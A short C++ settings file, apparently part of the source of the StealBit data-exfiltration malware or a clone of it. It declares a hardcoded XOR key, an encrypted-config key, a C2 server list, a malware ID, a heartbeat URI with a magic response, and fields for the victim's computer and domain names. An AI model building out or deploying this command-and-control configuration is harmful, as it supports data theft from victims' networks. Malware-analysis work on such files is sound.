#include "settings.hpp"
#include "base64.hpp"

namespace settings {
    // key = stealbit : 57ea1b17
    std::vector<unsigned char> key = {
        0x57, 0xEA, 0x1B, 0x17 
    };

    // XOR key for config
    std::vector<unsigned char> configKey = Base64Decoder::base64_decode(CONFIG_ENCRYPTION_KEY_BASE64);


    std::string config_path = CONFIG_FILE_PATH;

    std::vector<std::string> C2_SERVERS;

    std::string malware_id;

    std::string DJB2_SEED = DJB2_HASH_SEED;

    std::string C2_HEARTBEAT_URI = C2_URI;

    std::string C2_HEARTBEAT_MAGIC_RESPONSE = C2_MAGIC_RESPONSE;

    namespace environment {
        std::string computerName;

        std::string domainName;
    }
}